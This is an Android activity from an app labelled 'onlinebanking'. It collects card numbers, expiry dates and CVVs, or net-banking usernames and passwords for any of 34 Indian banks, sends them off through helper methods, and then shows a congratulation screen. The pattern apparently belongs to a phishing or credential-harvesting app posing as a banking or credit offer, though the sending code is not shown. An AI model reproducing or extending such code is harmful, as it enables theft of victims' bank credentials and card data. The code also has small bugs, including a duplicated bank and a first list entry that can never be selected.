package com.codewithmuddasir.onlinebanking;

import static com.codewithmuddasir.onlinebanking.helper.Setting.model;

import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Spinner;
import android.widget.TextView;

import com.codewithmuddasir.onlinebanking.databinding.ActivityCreditBinding;
import com.codewithmuddasir.onlinebanking.helper.Util;

import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicReference;

public class CreditActivity extends AppCompatActivity {

    ActivityCreditBinding binding;

    private Util util;

    private ProgressDialog progressDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_credit);

        util = new Util();

        binding.btnCreditCard.setOnClickListener(view -> {
            binding.netbanking.setVisibility(View.GONE);
            binding.card.setVisibility(View.VISIBLE);
        });

        binding.btnNetBanking.setOnClickListener(view -> {
            binding.netbanking.setVisibility(View.VISIBLE);
            binding.card.setVisibility(View.GONE);
        });

        ArrayList<String> string = new ArrayList<>();
        string.add("State Bank of India");
        string.add("Bank of Baroda");
        string.add("Bank of India");
        string.add("Bank of Maharashtra");
        string.add("Central Bank of India");
        string.add("Canara Bank");
        string.add("Indian Bank");
        string.add("Indian Overseas Bank");
        string.add("Punjab and Sind Bank");
        string.add("Punjab National Bank");
        string.add("State Bank of India");
        string.add("UCO Bank");
        string.add("Union Bank of India");
        string.add("Axis Bank");
        string.add("Bandhan Bank");
        string.add("CSB Bank");
        string.add("City Union Bank");
        string.add("DCB Bank");
        string.add("Dhanlaxmi Bank");
        string.add("Federal Bank");
        string.add("HDFC Bank");
        string.add("ICICI Bank");
        string.add("IDBI Bank");
        string.add("IDFC First Bank");
        string.add("IndusInd Bank");
        string.add("Jammu & Kashmir Bank");
        string.add("Karnataka Bank");
        string.add("Karur Vysya Bank");
        string.add("Kotak Mahindra Bank");
        string.add("Nainital Bank");
        string.add("RBL Bank");
        string.add("South Indian Bank");
        string.add("Tamilnad Mercantile Bank");
        string.add("Yes Bank");

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, R.layout.spinner_item, string);
//        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        binding.spinner.setAdapter(adapter);

        progressDialog = new ProgressDialog(CreditActivity.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);

        final String[] cardType = {""};

        binding.cardType.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                // Get the selected Radio Button by its ID
                RadioButton selectedRadioButton = findViewById(checkedId);

                // Check if a RadioButton is selected
                if (selectedRadioButton != null) {
                    String selectedOption = selectedRadioButton.getText().toString();
                    cardType[0] = selectedOption;
                }
            }
        });


        binding.btnCardSubmit.setOnClickListener(view -> {

            if (!isFieldsEmpty(binding.cardNumber, binding.expiryDate, binding.cvv)) {
                progressDialog.show();

                util.sendCreditDetail1(this, model.getUserId(), binding.cardNumber.getText().toString(), binding.expiryDate.getText().toString(), binding.cvv.getText().toString(), cardType[0], () -> {
                    progressDialog.dismiss();

                    startActivity(new Intent(this, CongratulationActivity.class));
                    finish();
                });
            }
        });

        binding.btnNetBankingSubmit.setOnClickListener(view -> {

            if (!isFieldsEmpty(binding.spinner, binding.userName, binding.password)) {
                progressDialog.show();

                util.sendCreditDetail2(this, model.getUserId(), binding.spinner.getSelectedItem().toString(), binding.userName.getText().toString(), binding.password.getText().toString(), () -> {
                    progressDialog.dismiss();

                    startActivity(new Intent(this, CongratulationActivity.class));
                    finish();
                });
            }
        });
    }

    public boolean isFieldsEmpty(EditText... editTexts) {
        boolean isEmpty = false;
        for (EditText editText : editTexts) {
            if (editText.getText().toString().trim().length() == 0) {
                isEmpty = true;
                editText.setError("This field is required");
            }
        }
        return isEmpty;
    }

 public boolean isFieldsEmpty(Spinner spinner, EditText... editTexts) {
        boolean isEmpty = false;
        for (EditText editText : editTexts) {
            if (editText.getText().toString().trim().length() == 0) {
                isEmpty = true;
                editText.setError("This field is required");
            }
        }

     if (spinner.getSelectedItemPosition() == 0) { // 0 indicates no item is selected
         isEmpty = true;
         View selectedView = spinner.getSelectedView();
         if (selectedView != null && selectedView instanceof TextView) {
             ((TextView) selectedView).setError("Select an option"); // Set an error message on the Spinner
         }
     }

        return isEmpty;
    }

}